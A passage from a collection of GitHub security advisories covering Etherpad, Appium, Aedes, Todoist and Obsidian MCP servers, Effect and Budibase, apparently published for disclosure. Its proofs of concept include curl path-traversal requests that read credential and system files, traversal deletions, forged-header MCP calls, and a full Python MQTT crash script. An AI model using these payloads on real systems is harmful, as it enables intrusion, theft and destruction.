// loop exits when current.subject === anchor.subject
return chain;  // returned WITHOUT verifying `current` against the anchor
```

The signature-verified closure path (`if (!issuer)` -> `verifySignature(current, anchor)`) is correct, but the `while` guard provides a second, unverified exit: when a supplied certificate (the leaf, or an attacker-supplied intermediate) has a Subject DN string equal to the anchor's, the loop body never runs, no `verifySignature` call is made, and the chain is returned as valid. The per-certificate checks that do run (validity, algorithm, keyUsage) all operate on the attacker-controlled certificate and do not bind it to the anchor.

Secondary contributing weakness (`src/trust/TrustEvaluator.ts`): the anchor selected for the result was matched by `serialNumber` and **fell back to `anchors[0]`** when no match was found, so the forged leaf was reported alongside a genuine anchor's `trustedAuthorityIds` / provenance.

## Proof of Concept

```js
// Attacker mints a self-signed cert reusing a trusted anchor's Subject DN.
const impostor = selfSigned({ subject: trustedAnchor.subject /* string */ });
// Vulnerable: resolves to a valid chain [impostor] with no signature check.
await new ChainBuilder().build(impostor, [trustedAnchor]);
```

## Patch

`ChainBuilder.tryBuild()` now requires the terminating certificate to be **byte-identical to the trust anchor** (DER `rawData` comparison) when the loop exits on DN equality; otherwise it throws `CertificateChainError` with `reason: "signature"`. Cryptographic closure via `verifySignature(current, anchor)` remains the only other accepted termination. As defense-in-depth, `TrustEvaluator` now selects the terminating anchor by DER byte-identity and throws instead of silently falling back to the first candidate. Fixed in `0.8.1`.

## Workarounds

None. Upgrade to `0.8.1`.

## Credits

Reported by **Reza Shokri** — Quellkern e.U. (https://augenmass.tech), GitHub [@devdotbo](https://github.com/devdotbo). Thanks for the thorough report, the self-contained reproduction, and coordinated disclosure.

### GHSA-833v-v58w-294h — Todoist MCP Server: Browser DNS rebinding lets websites write and delete Todoist data through local MCP server
- Aliases: CVE-2026-76807 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: CRITICAL
- CWE: CWE-346, CWE-350
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`
- Affected npm/@doist/todoist-mcp: introduced:0 fixed:10.3.3

The self-hosted `todoist-mcp-http` server accepts browser-origin MCP requests with attacker-controlled `Host` and `Origin` headers. A malicious website can use DNS rebinding to route its own origin to a victim's local `127.0.0.1` MCP server, then invoke Todoist MCP tools without a caller credential.

This affects `github.com/Doist/todoist-mcp` at commit `d2903e0d945d2a559d71c091337ad6380511e62f`, package version `10.3.1`, when the optional Streamable HTTP server is running. The stdio entrypoint is not browser-reachable. The vulnerable browser-reachable component is `todoist-mcp-http`.

The documented HTTP server mode runs all MCP tools with the operator's `TODOIST_API_KEY` and binds to loopback by default:

```bash
TODOIST_API_KEY=your-key npx -p @doist/todoist-mcp todoist-mcp-http
```

`src/main-http.ts:28-30` sets the HTTP bind host and port:

```ts
const PORT = Number.parseInt(process.env.PORT || '3000', 10)
const HOST = process.env.HOST || '127.0.0.1'
const LISTEN_HOST = normalizeListenHost(HOST)
```

`src/main-http.ts:88-99` dispatches `POST /mcp` to `StreamableHTTPServerTransport` without validating `Host` or `Origin`:

```ts
app.post(
    '/mcp',
    requireValidTodoistToken({ type: 'static', apiKey: todoistApiKey, baseUrl }),
    async (req: Request, res: Response) => {
        const transport = new StreamableHTTPServerTransport({
            sessionIdGenerator: undefined,
        })

        const server = getMcpServer({ todoistApiKey, baseUrl })
        await server.connect(transport)
        await transport.handleRequest(req, res, req.body)
    },
)
```

`src/middleware/require-valid-todoist-token.ts:105-117` validates the configured server-side Todoist token and then forwards the request. It does not authenticate the browser caller:

```ts
const valid = await getValidation()

if (valid) {
    next()
    return
}
```

`src/mcp-server.ts:215-285` registers Todoist read and write tools against the server-side Todoist API client, including `add-tasks`, `complete-tasks`, `update-tasks`, `delete-object`, comments, reminders, labels, filters, goals, and assignments.

## Proof of concept

Start the upstream local HTTP server with an operator-owned Todoist test account:

```bash
git clone https://github.com/Doist/todoist-mcp.git
cd todoist-mcp
git checkout d2903e0d945d2a559d71c091337ad6380511e62f
npm ci --ignore-scripts
npm run build

export TODOIST_API_KEY='<Todoist test account API token>'
PORT=8082 HOST=127.0.0.1 node dist/main-http.js
```

The server prints:

```text
Todoist MCP HTTP Server started on 127.0.0.1:8082
MCP endpoint: http://127.0.0.1:8082/mcp
```

From a browser page using DNS rebinding, route the attacker origin to `127.0.0.1:8082` and send MCP JSON-RPC requests to `POST /mcp`.

First enumerate tools. The rebound browser session can list Todoist write tools such as `add-tasks` and `complete-tasks`.

Call `user-info`:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "user-info",
    "arguments": {}
  }
}
```

Observed result: the response returns the Todoist account tied to the server-held `TODOIST_API_KEY`.

Create a disposable task:

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "add-tasks",
    "arguments": {
      "tasks": [
        {
          "content": "DNS REBINDING DEMO - attacker-created task",
          "description": "Created through browser-origin DNS rebinding against local todoist-mcp-http.",
          "priority": "p1",
          "dueString": "today"
        }
      ]
    }
  }
}
```

Observed result: Todoist creates the task and the MCP response returns the new task ID.

Complete the same task:

```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "complete-tasks",
    "arguments": {
      "ids": [
        "<RETURNED_TASK_ID>"
      ]
    }
  }
}
```

Observed result: the MCP response returns `successCount: 1`, and the Todoist UI shows the same task completed.

[demo video](https://drive.google.com/file/d/1zfgYQS-vbi1zc8N2JayShtwBCZbN-doG/view)

## Impact

A public website can operate a victim's local `todoist-mcp-http` server when the optional HTTP transport is running. The browser does not supply a Todoist API token. The MCP server supplies its configured `TODOIST_API_KEY`.

The demonstrated impact is Todoist task creation and completion. The same browser-origin path exposes the rest of the registered Todoist write surface, including task updates, task rescheduling, project and section changes, comments, reminders, filters, labels, goals, assignments, and object deletion.

This violates the browser-origin boundary. A user can run the MCP server only on loopback and still become reachable from an unrelated public website because DNS rebinding preserves the attacker's `Host` and `Origin` while routing the TCP connection to `127.0.0.1`.

## Why this is a vulnerability

- The default HTTP bind target is loopback, which users reasonably treat as local-only.
- DNS rebinding makes loopback HTTP reachable from a public website unless the server validates `Host` and `Origin`.
- The MCP route does not require a per-request caller secret.
- The middleware validates the server's Todoist backend token, not the browser caller.
- Tool execution uses the server-held `TODOIST_API_KEY` to mutate Todoist state.

## Remediation

Add strict `Host` validation before MCP dispatch. For local deployments, accept only explicit loopback hostnames such as `127.0.0.1`, `localhost`, `[::1]`, and any operator-configured trusted names.

Reject browser requests with missing or untrusted `Origin` values before they reach `StreamableHTTPServerTransport`.

Require a per-run local bearer token or equivalent caller secret for HTTP MCP mode, including loopback deployments. Host and Origin validation reduce DNS-rebinding exposure, but they are not caller authentication.

Enable DNS rebinding protection in the MCP SDK HTTP transport if available, and pass explicit allowed host and origin lists. Keep stdio as the safest default local transport.

## Reporter

Avishai Gonen - Pluto Security

### GHSA-mx6p-3fg7-v6pj — obsidian-sync-mcp: Missing Host/Origin validation lets a public website drive a victim's Obsidian vault via DNS rebinding (no-auth mode)
- Aliases: CVE-2026-77283 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: HIGH
- CWE: CWE-350
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`
- Affected npm/obsidian-sync-mcp: introduced:0 fixed:0.5.7

When obsidian-sync-mcp runs without MCP_AUTH_TOKEN (the documented no-auth mode for local use), the HTTP MCP endpoint does not validate the Host or Origin header before dispatching MCP methods (CWE-350). The no-auth mode's "local network only" assumption therefore does not hold: a malicious web page the operator visits can use DNS rebinding to resolve an attacker-controlled hostname to 127.0.0.1 (or the operator's LAN/VPN/Docker-published address) and issue requests the server accepts as trusted local calls, reaching the full tool surface (read_note, write_note, edit_note, delete_note, move_note, list_notes, list_folders, list_tags, get_note_metadata).

Affected versions: <= 0.5.6
Patched version: 0.5.7

## Impact

Any deployment running without MCP_AUTH_TOKEN — including the README "Filesystem mode (simplest)" quickstart and the self-hosted docker-compose setup (where MCP_AUTH_TOKEN defaults to empty)" — is exposed to any website the operator visits while the server is running. That page's JavaScript can silently read the entire vault and create/overwrite/delete/move notes, with no credentials and no prompt. In CouchDB/Self-hosted LiveSync mode, the same code path applies, so vault content in CouchDB is equally reachable. Deployments that set MCP_AUTH_TOKEN are not affected — a bearer token is not attached by browsers, so a forged request returns HTTP 401.

## Remediation

Upgrade to 0.5.7, which validates both the Host and Origin headers in no-auth mode: any request whose Host is not localhost/127.0.0.1/::1 (or a value in the new MCP_ALLOWED_HOSTS), or that carries a cross-origin Origin not in that allowlist, is rejected before any MCP method runs. The Host check defeats DNS rebinding; the Origin check defeats the related bypass where a page directly fetches http://127.0.0.1:<port>/mcp (genuine loopback Host, attacker Origin) — the transport's wildcard CORS would otherwise expose the response. Non-browser MCP clients send no Origin, so they are unaffected. These checks block browser-delivered attacks only; a direct non-browser network client can still forge both headers, so on untrusted networks set MCP_AUTH_TOKEN.

Workaround (any version): set MCP_AUTH_TOKEN to require authentication — this closes the path immediately.

## Technical detail

In no-auth mode serverOptions.authenticate was never installed, so FastMCP dispatched every request with no per-request check. Even with a token, only the Authorization header was inspected — nothing in the server, fastmcp, or mcp-proxy validated Host/Origin. Two browser-reachable variants follow: (1) classic DNS rebinding, where the browser sends the attacker's hostname in Host; and (2) a direct cross-origin fetch() to the loopback address, where Host is genuinely 127.0.0.1 but Origin is attacker-controlled and the transport's wildcard Access-Control-Allow-Origin: * exposes the response — no rebinding required. The 0.5.7 fix adds an application-layer Host+Origin check in authenticate that rejects such requests before dispatch; it is a compensating control and does not alter the wildcard CORS header itself (the rejection happens before any response body is produced).

## Proof of concept (mitigated in 0.5.7)
```
# No-auth server (per the README quickstart)
VAULT_PATH=/tmp/demo-vault HOST=127.0.0.1 PORT=8787 npx tsx src/main.ts

# Forged Host/Origin (what a DNS-rebinding page's fetch() sends) reaches the tools with no credential:
curl -s -i http://127.0.0.1:8787/mcp \
  -H "Host: attacker.example" -H "Origin: http://attacker.example" \
  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'
# -> HTTP 200; a follow-up tools/call to write_note creates a file in the vault, no Authorization header.
# The same sequence against a server with MCP_AUTH_TOKEN set returns HTTP 401.
```

```
# Variant 2 — no rebinding needed: real loopback Host, attacker Origin.
# In <= 0.5.6 this returns 200 and executes tools; in 0.5.7 it returns 403.
curl -s -i http://127.0.0.1:8787/mcp \
  -H "Host: 127.0.0.1:8787" -H "Origin: http://attacker.example" \
  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'
```

### GHSA-7589-6fvf-x4pw — Effect: ReDoS in Schema.TemplateLiteral compiled regex
- Aliases: CVE-2026-121707 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: HIGH
- CWE: CWE-1333
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected npm/effect: introduced:0 fixed:3.22.1

### Impact

`Schema.TemplateLiteral` compiles each `Schema.String` span to the lazy wildcard `[\s\S]*?` and decodes input by running the resulting regular expression against it. When a template has two or more `Schema.String` spans, for example:

```ts
Schema.TemplateLiteral(Schema.String, ":", Schema.String, ":", Schema.String, "X")
```

the regex contains several ambiguous wildcards. A non-matching input makes the backtracking engine try combinations across all of them, so matching time grows cubically with input length. A 5,000-character string of `:` characters blocks the event loop for about 15 seconds.

Applications that decode untrusted input with such a schema are affected. That includes `Schema.decodeUnknown`, `Schema.decodeUnknownSync` and `Schema.is`, and anything built on them, such as `HttpApi` request payloads and `@effect/rpc` payloads.

### Patches

Fixed in `effect@3.22.1` (#6761). Template literals whose spans are all `Schema.String` are now matched with a linear left-to-right scan instead of a regular expression.

### Workarounds

If you can't upgrade, check the input length before the template literal runs. Adding `Schema.maxLength` with `.pipe` doesn't help, because the filter runs after the regex. Put the length check on the input side instead:

```ts
Schema.compose(Schema.String.pipe(Schema.maxLength(256)), MyTemplateLiteral)
```

Rejecting oversized request bodies before they reach the schema also works.

References:
- https://github.com/Effect-TS/effect/security/advisories/GHSA-7589-6fvf-x4pw [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-121707 [ADVISORY]
- https://github.com/Effect-TS/effect/pull/6761 [WEB]
- https://github.com/Effect-TS/effect/commit/3cc3c6e1a64cbdc360e9d28e44f3ec3ce0ece6e3 [WEB]
- https://github.com/Effect-TS/effect [PACKAGE]
- https://github.com/Effect-TS/effect/releases/tag/effect@3.22.1 [WEB]

### GHSA-mc8w-wjhw-45x5 — Etherpad: Pre-auth arbitrary file read
- Aliases: CVE-2026-114516 | Published: 2026-11-20 | Modified: 2026-11-20 | Severity: CRITICAL
- CWE: CWE-200, CWE-22, CWE-306
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Affected npm/ep_etherpad-lite: introduced:1.8.14 fixed:3.3.3

### Summary

An unauthenticated path‑traversal / arbitrary file read vulnerability in Etherpad's /static/* handler allows any remote, unauthenticated user to read any file on the server's filesystem (e.g. GET /static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd returns /etc/passwd) available to the user running the etherpad software. Because the endpoint is mounted before the authentication middleware, no credentials, session, or configuration change are required. The read primitive could escalate to a full server compromise: on a typical deployment by disclosing settings.json / credentials.json / /proc/self/environ, which contain the admin password, giving an attacker an admin session and, through the admin plugin installer, remote code execution.

### Details

Etherpad serves plugin static assets through src/node/utils/Minify.ts. The request path is first passed through the canonical sanitizer src/node/utils/sanitizePathname.ts, which is careful to convert backslashes to forward slashes only on Windows:

```
// src/node/utils/sanitizePathname.ts:11-20
p = pathApi.normalize(p);
if (pathApi.isAbsolute(p)) throw new Error(`absolute paths are forbidden: ${p}`);
if (p.split(pathApi.sep)[0] === '..') throw new Error(`directory traversal: ${p}`);
// THIS CONVERSION MUST ONLY BE DONE ON WINDOWS, otherwise on POSIXish systems '..\\' in the input
// pathname would not be normalized away before being converted to '../'.
if (pathApi.sep === '\\') p = p.replace(/\\/g, '/');
```

On Linux a backslash is an ordinary filename byte, so an input segment like ..\..\..\test contains no ./.. path components and passes every check in sanitizePathname unchanged. The project's own test suite confirms this: src/tests/backend-new/specs/sanitizePathname.ts:62 lists ['posix', '..\\foo'] among the accepted paths (returned unchanged).

The vulnerability is that Minify.ts then performs that Windows‑only conversion unconditionally, after the sanitizer has run, justified by a comment asserting the opposite of the invariant above:

```
// src/node/utils/Minify.ts:171-186
const match = filename.match(/^plugins\/([^/]+)(\/(?:(static\/.*)|.*))?$/);
if (match) {
const library = match[1];
const libraryPath = match[2] || '';
if (plugins.plugins[library] && match[3]) {
const plugin = plugins.plugins[library];
const pluginPath = plugin.package.realPath;      // for 'ep_etherpad-lite' == <root>/src
filename = path.join(pluginPath, libraryPath);   // -> absolute path, backslashes preserved
// ... "This conversion does not introduce a directory
// traversal vulnerability because all '..\\' substrings have already been removed by
// sanitizePathname."                              // <-- FALSE on POSIX
filename = filename.replace(/\\/g, '/');          // <-- reintroduces ../ AFTER the check
}
```

After line 186 the string becomes a real traversal (<root>/src/static/../../../../etc/passwd) with no re‑normalization and no containment check
before the filesystem calls at Minify.ts:248 (fs.stat) and Minify.ts:315 (fs.readFile). Because path.join at line 179 produced an absolute
path, path.resolve(ROOT_DIR, filename) discards ROOT_DIR entirely, and POSIX path.resolve collapses surplus .. at /, so the payload is root‑depth‑agnostic.

The route is reachable pre‑authentication. It is registered on the expressPreSession hook:

```
// src/ep.json
{ "name": "static", "hooks": { "expressPreSession": "ep_etherpad-lite/node/hooks/express/static" } }
// src/node/hooks/express/static.ts:38
app.all('/static/*filename', minify);
```

and expressPreSession runs before the auth middleware:

```
// src/node/hooks/express.ts:244-247
await hooks.aCallAll('expressPreSession', {app, settings});   // static route registered here
app.use(exports.sessionMiddleware);
app.use(webaccess.checkAccess);                                // auth runs AFTER
```

The plugin branch is always taken because src/static/js/pluginfw/plugins.ts:153-158 unconditionally registers the core pseudo‑plugin ep_etherpad-lite with package.realPath = <root>/src.

Two decode facts make the exploit functional: Express 5 / path‑to‑regexp v8 decode wildcard params per segment, once ((v) =>  v.split('/').map(decodeURIComponent)), so req.params.filename.join('/') (Minify.ts:147) yields the once‑decoded path fed to the sanitizer, and %5C (encoded backslash) is the only working separator (%2F decodes to /, is re‑split, and is rejected by the split('/')[0] === '..' guard).

### PoC

Applies to a default production deployment (no special configuration; works on Linux, e.g. the Docker image or a systemd source install). Replace TARGET:9001 with the instance.

1. Read /etc/passwd (or any file) with no authentication. --path-as-is prevents the client from folding the traversal:

```
curl --path-as-is \
'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd'
```

Other high‑value reads (over‑shoot the .. depth; it is absorbed at /):

admin password + secrets, root-agnostic via /proc/self/cwd
```
curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/settings.json'
curl --path-as-is
'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/credentials.json'
```
on docker-compose deployments the admin password is an env var:
`curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/environ'`

Each response returns the raw file bytes (with a harmless Content-Type: false header for extension‑less targets, Node coerces the value and does not throw).

2. Escalate to RCE. Recover the admin credential from the files read in step 1, then:

mint an admin session
```
curl -i -X POST 'http://TARGET:9001/admin-auth/' \
-H "Authorization: Basic $(printf 'admin:PASSWORD' | base64)"
# -> 200 + Set-Cookie: <prefix>express_sid=...
```

Using that express_sid cookie, connect to the /pluginfw/installer Socket.IO namespace (gated only on session.user.is_admin, src/node/hooks/express/adminplugins.ts:22) and emit install for an attacker‑controlled ep_* plugin. Etherpad require()s the plugin's code in‑process during plugins.update() (src/static/js/pluginfw/shared.ts:30), executing arbitrary code as the Etherpad user.

### Impact

- Type: Improper limitation of a pathname → unauthenticated arbitrary file read, with potential to remote code execution.
- Access required: None. The vulnerable route is served before the authentication/authorization middleware, so it is exploitable by any client that can reach the HTTP port, regardless of requireAuthentication, requireAuthorization, or users configuration.
- What an attacker can access: any file readable by the Etherpad process user, including settings.json/credentials.json (admin password, sessionKey, database credentials, SSO client secrets), /proc/self/environ (env‑supplied secrets such as ADMIN_PASSWORD, DB_PASS), the pad database, TLS private keys, and OS files such as /etc/passwd.
- Escalation: the disclosed admin password yields an admin session; the admin plugin installer then provides in‑process code execution, i.e. full server takeover. Even without the plugin step, admin access permits rewriting the entire configuration (saveSettings + restartServer) and exfiltrating all stored data.
- Who is impacted: every operator running an affected version, most severely those exposing Etherpad directly to untrusted networks. A reverse proxy does not mitigate it, the traversal uses %5C, which proxies forward unchanged.

References:
- https://github.com/ether/etherpad/security/advisories/GHSA-mc8w-wjhw-45x5 [WEB]
- https://github.com/ether/etherpad/pull/8081 [WEB]
- https://github.com/ether/etherpad/commit/9c8d16d50e2fdfd9693ab35c43280410cb4db2fc [WEB]
- https://github.com/ether/etherpad [PACKAGE]

### GHSA-jwgx-mp9m-jwcr — appium allows unauthenticated arbitrary file/directory deletion in @appium/storage-plugin
- Aliases: CVE-2026-58192 | Published: 2026-11-20 | Modified: 2026-11-20 | Severity: HIGH
- CWE: CWE-22, CWE-73
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N`
- Affected npm/@appium/storage-plugin: introduced:0 fixed:1.1.6

## Summary

The Appium storage plugin exposes an HTTP endpoint `POST /storage/delete` that takes a user-supplied `name` and deletes it from the server storage folder. The handler passes `name` straight into `path.join(storageRoot, name)` and then `fs.rimraf()` **without any path sanitization**. By sending a `name` containing `../` sequences, an unauthenticated remote client can escape the storage root and **recursively delete arbitrary files and directories** that the Appium process user can write, anywhere on the host filesystem.

The same plugin's *upload* path validates the name via `fs.sanitizeName` (`requireValidItemOptions`), but the *delete* path does not an asymmetry that makes the missing validation unambiguous.


### Details

Published build (`node_modules/@appium/storage-plugin/build/lib/storage.js`), and source (`packages/storage-plugin/lib/`):

- `packages/storage-plugin/lib/storage.ts:65-75` — `Storage.delete()`:
  ```ts
  async delete(name: string): Promise<boolean> {
    if (name.toLowerCase().endsWith(TMP_EXT)) {
      return false;
    }
    const destinationPath = path.join(this._root, name);   // <-- no sanitization
    if (!(await fs.exists(destinationPath))) {
      return false;
    }
    await fs.rimraf(destinationPath);                       // <-- recursive delete
    return true;
  }
  ```
- `packages/storage-plugin/lib/plugin.ts:77-83` — handler passes raw body:
  ```ts
  STORAGE_HANDLERS.deleteStorageItem = async function deleteStorageItem(req) {
    return await executeStorageMethod(
      async (storage) => await storage.delete(parseRequestArgs(req, ['name']).name),
    );
  };
  ```
`parseRequestArgs` (`plugin.ts:94-106`) only checks that the key exists; it does **not** validate the value.
- Contrast — the upload path *does* sanitize: `storage.ts:53-54` `add()` →
`requireValidItemOptions()` (`storage.ts:236-256`) rejects any `name` that differs from `fs.sanitizeName(name)`. `delete()` skips this entirely.

### PoC

1. Install and start the server with the storage plugin:
   ```sh
   npm install appium@3.5.0
   ./node_modules/.bin/appium plugin install --source=npm @appium/storage-plugin
   ./node_modules/.bin/appium --use-plugins=storage --address 127.0.0.1 --port 4723
   ```
(Default `--address` is `0.0.0.0`; `127.0.0.1` used here for a contained test.)

2. Plant a victim file/dir outside the storage root, then delete via traversal:
   ```sh
   mkdir -p /tmp/pv_dir && echo SECRET > /tmp/pv_dir/important.txt
   echo single > /tmp/pv_file.txt

   curl -s -X POST http://127.0.0.1:4723/storage/delete \
     -H 'Content-Type: application/json' \
     -d '{"name":"../../../../../../../../../../tmp/pv_file.txt"}'
   # -> {"value":true}

   curl -s -X POST http://127.0.0.1:4723/storage/delete \
     -H 'Content-Type: application/json' \
     -d '{"name":"../../../../../../../../../../tmp/pv_dir"}'
   # -> {"value":true}
   ```

<img width="2182" height="678" alt="image" src="https://github.com/user-attachments/assets/a4984132-3334-41c5-9a29-12ec59461d25" />


### Impact

An unauthenticated attacker who can reach the Appium HTTP port (network by default, or cross-origin via a victim browser due to default CORS + no auth) can recursively delete any file or directory writable by the Appium process user. On CI runners, device farms, and developer machines this enables destruction of source trees, build artifacts, SSH keys, configuration, or the OS user profile data loss and denial of service. Appium frequently runs with broad privileges on shared device-lab hosts, amplifying impact.

References:
- https://github.com/appium/appium/security/advisories/GHSA-jwgx-mp9m-jwcr [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-58192 [ADVISORY]
- https://github.com/appium/appium/pull/22362 [WEB]
- https://github.com/appium/appium/commit/5fee01752f2782e96fbe64fd13520b433d4a7535 [WEB]
- https://github.com/appium/appium [PACKAGE]
- https://github.com/appium/appium/releases/tag/%40appium/storage-plugin%401.1.6 [WEB]

### GHSA-xxqp-5qx8-gj5q — Aedes has Uncaught Exception and Uncontrolled Resource Consumption
- Aliases: CVE-2026-63341 | Published: 2026-11-20 | Modified: 2026-11-20 | Severity: HIGH
- CWE: CWE-248, CWE-400
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/aedes: introduced:0 fixed:1.1.1

### Summary
A remote Denial of Service (DoS) vulnerability, allows any remote client to cause a complete crash of the Aedes MQTT broker process. This is achieved by sending a specially crafted MQTT message (via PUBLISH or SUBSCRIBE), or by setting a Will message with such a topic, containing a highly recursive topic string (e.g., with thousands of '/' delimiters). The lack of input validation and error handling leads to an uncaught exception in an internal routing library, terminating the entire Node.js application.

### Details
The Aedes broker fails to enforce limits on the depth or structural complexity of MQTT topic strings. When a client publishes to or subscribes to a topic with excessive levels of recursion, the internal routing logic cascading into the qlobber library (via mqemitter) reaches an hard-coded limit within the qlobber._split_words function.

This function throws a hard Error: too many words (found in lib/qlobber.js:604). Crucially, Aedes does not wrap the calls to these internal modules (such as in handlers/subscribe.js or the publishing logic) in try-catch blocks. Consequently, this exception propagates up to the main Node.js event loop as an unhandled exception, causing the entire broker process to crash immediately.

This vulnerability affects all stable versions of Aedes due to the underlying dependency behavior and missing perimetral validation.

Stack Trace from Crash:
```Plaintext
aedes-broker  | /app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604
aedes-broker  | 	throw new Error('too many words');
aedes-broker  | 	^
aedes-broker  | 
aedes-broker  | Error: too many words
aedes-broker  |     at Qlobber._split_words (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604:15)
aedes-broker  |     at Qlobber._split (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:624:18)
aedes-broker  |     at Qlobber.add (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:651:43)
aedes-broker  |     at MQEmitter.on (/app/node_modules/mqemitter/mqemitter.js:65:17)
aedes-broker  |     at Aedes.subscribe (/app/node_modules/aedes/aedes.js:289:11)
aedes-broker  |     at SubState.addSubs (/app/node_modules/aedes/lib/handlers/subscribe.js:167:12)
```
The same uncaught exception can be triggered without an explicit PUBLISH/SUBSCRIBE: a client that registers a Will message with a deeply nested topic crashes the broker when the Will is published on ungraceful disconnect, because the Will publish path calls broker.publish directly and bypasses the PUBLISH handler.

### PoC
**Prerequisites**
+ Aedes MQTT Broker running and accessible over the network. For testing and replication, the broker was deployed using the official Docker image via the following command:
```bash
docker run -d --name aedes-broker -p 1883:1883 moscajs/aedes:latest
```
+ Ability to establish an MQTT session (authenticated or unauthenticated, as per the broker's configuration).

**Reproduction Steps**

1. Save the following Python stress testing script (mqtt_crash_poc.py):
```Python
#!/usr/bin/env python3
import argparse
import time
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, reason_code, properties=None):
    if reason_code != 0:
        print(f"[-] Error en la conexión: {reason_code}")

def on_disconnect(client, userdata, disconnect_flags, reason_code, properties=None):
    if reason_code != 0:
        print(f"[*] -> Desconexión detectada (Caída del bróker). Razón: {reason_code}")

def run_exploit(host, port):
    # Escenarios de colapso directo (Casos 1.2, 1.3, 2.2, 2.3)
    payloads = [
            {"type": "PUB_DEEP", "topic": "a/" * 30000 + "target"},
            {"type": "PUB_LIMIT", "topic": "a/" * 32766 + "a/b"},
            {"type": "SUB_WILD", "topic": "+/" * 150 + "#", "pub": "A/" * 150 + "target"},
            {"type": "SUB_DEEP", "topic": "+/" * 10000 + "#", "pub": "A/" * 10000 + "target"}
    ]
        
    for case in payloads:
        print(f"\n[*] Lanzando vector de ataque tipo: {case['type']}")
        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        client.on_connect = on_connect
        client.on_disconnect = on_disconnect
            
        try:
            client.connect(host, port, keepalive=60)
            client.loop_start()
            time.sleep(1)
                
            if "PUB" in case['type']:
                client.publish(case['topic'], payload="DoS_Attack", qos=0)
            else:
                client.subscribe(case['topic'], qos=0)
                time.sleep(1)
                client.publish(case['pub'], payload="DoS_Attack", qos=0)
                    
            time.sleep(2)
        except Exception as e:
            print(f"[-] Error durante el envío: {e}")
        finally:
            client.loop_stop()
            client.disconnect()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--direccion", required=True, help="IP del broker")
    parser.add_argument("-p", "--puerto", type=int, default=1883, help="Puerto")
    args = parser.parse_args()
    run_exploit(args.direccion, args.puerto)
```

2. Run the script against the target broker:python3 mqtt_crash_poc.py -d <BROKER_IP> -p 1883
3. Upon execution, the Aedes broker dies instantly on the very first packet (PUB_DEEP). Checking the container logs will reveal the stack trace provided in the Details section, confirming the Error: too many words exception.

### Impact
This is a Remote Denial of Service (DoS) vulnerability. It affects any infrastructure running an unpatched Aedes MQTT Broker. A successful attack terminates the service entirely, disconnecting all legitimate clients (IoT devices, applications, users) and preventing reconnection until the process is manually or automatically restarted, causing severe business and operational interruption.

References:
- https://github.com/moscajs/aedes/security/advisories/GHSA-xxqp-5qx8-gj5q [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-63341 [ADVISORY]
- https://github.com/moscajs/aedes/commit/b9024faa4cb416c4c6980760b4d7f55336315f2d [WEB]
- https://github.com/moscajs/aedes [PACKAGE]
- https://github.com/moscajs/aedes/releases/tag/v1.1.1 [WEB]

### GHSA-r2q3-7m4h-63qg — Budibase: Cross-privilege Stored XSS in the Budibase Builder via broken HTML-escaping in `jsonFormatter.format()` rendered through `{@html}` in the CSP-less Builder origin
- Aliases: CVE-2026-122244 | Published: 2026-11-20 | Modified: 2026-11-20 | Severity: HIGH
- CWE: CWE-1021, CWE-116, CWE-79
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N`
- Affected npm/@budibase/server: introduced:0 last_affected:3.38.1

## Description

### Summary

A **low-privileged application end-user** (role `BASIC` - **not** a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a **builder or admin** later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section **Formula** column editor, or any binding drawer), the stored value is rendered as **raw HTML** and the attacker's JavaScript executes in the Builder's origin.

